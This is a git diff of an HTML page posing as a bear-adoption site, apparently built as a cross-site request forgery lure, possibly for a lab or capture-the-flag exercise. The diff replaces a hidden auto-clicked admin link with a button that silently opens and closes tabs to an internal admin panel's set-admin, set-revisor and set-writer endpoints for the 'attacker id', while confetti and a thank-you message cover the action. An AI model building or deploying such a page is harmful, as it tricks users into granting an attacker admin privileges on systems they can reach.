@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cat Page</title>
+    <title>Bear Page</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -24,7 +24,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
-        
+
         .button {
             display: inline-block;
             padding: 10px 20px;
@@ -85,30 +85,54 @@
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to the Bears Page</h1>
-        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">SCOPRI IL TUO ORSETTO</a>
+        <h1 id="title">Welcome to the Bears Page</h1>
         <p>Here you can learn everything about bears. Bears are big, carnivorous mammals that are often visible in forests. They are known for their agility, playfulness, and ability to hunt humans.</p>
         <img src="https://placebear.com/200/300" alt="Cute bear">
         <br><br>
-        <!-- update user id according to the attacker id -->
-        <a id="csrf-link" href="http://internal.admin:8000/admin/2/set-admin" class="button" style="display: none;">Adopt a cute bear for free!</a>
-        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">ADOTTAMI, E' GRATIS :)</a>
+
+        <button class="button" onclick="csrfAndRedirect()">SCOPRI IL TUO ORSETTO</button>
+
         <div id="message" class="message">Your bear thanks you :)</div>
     </div>
-    
+
     <script>
-        setTimeout(() => {
-            // Recupera il bottone e simula il click
-            const csrfLink = document.getElementById("csrf-link");
-            csrfLink.click();
-        }, 5000);
-        
+        // update user id according to the attacker id (8)
+        const CSRF_BASE = "http://internal.admin:8000";
+        const USER_ID = 8;
+        const CSRF_ENDPOINTS = [
+            "/admin/" + USER_ID + "/set-admin",
+            "/admin/" + USER_ID + "/set-revisor",
+            "/admin/" + USER_ID + "/set-writer"
+        ];
+
+        function csrfAndRedirect() {
+            // Fires every CSRF request, each one in a new tab that auto-closes
+            CSRF_ENDPOINTS.forEach(function(path, index) {
+                setTimeout(function() {
+                    var win = window.open(CSRF_BASE + path, "_blank");
+                    if (win) {
+                        setTimeout(function() {
+                            win.close();
+                        }, 100); // closes the tab after 100ms
+                    }
+                }, index * 300); // slight delay so all requests are fired
+            });
+
+            launchConfetti();
+            // Change the main H1 text
+            document.getElementById('title').textContent = 'Thank you for adopting a bear!';
+            // Hide the button
+            document.querySelector('.button').style.display = 'none';
+            // Show the message
+            document.getElementById('message').style.display = 'block';
+        }
+
         function launchConfetti() {
             for (let i = 0; i < 100; i++) {
                 createConfetti();
             }
         }
-        
+
         function createConfetti() {
             const confetti = document.createElement('div');
             confetti.classList.add('confetti');
@@ -118,12 +142,12 @@
             confetti.style.setProperty('--y', (Math.random() - 0.5) * 300 + 'vh');
             confetti.style.backgroundColor = getRandomColor();
             document.body.appendChild(confetti);
-            
+
             setTimeout(() => {
                 confetti.remove();
             }, 2000);
         }
-        
+
         function getRandomColor() {
             const colors = ['red', 'blue', 'green', 'yellow', 'orange', 'purple'];
             return colors[Math.floor(Math.random() * colors.length)];
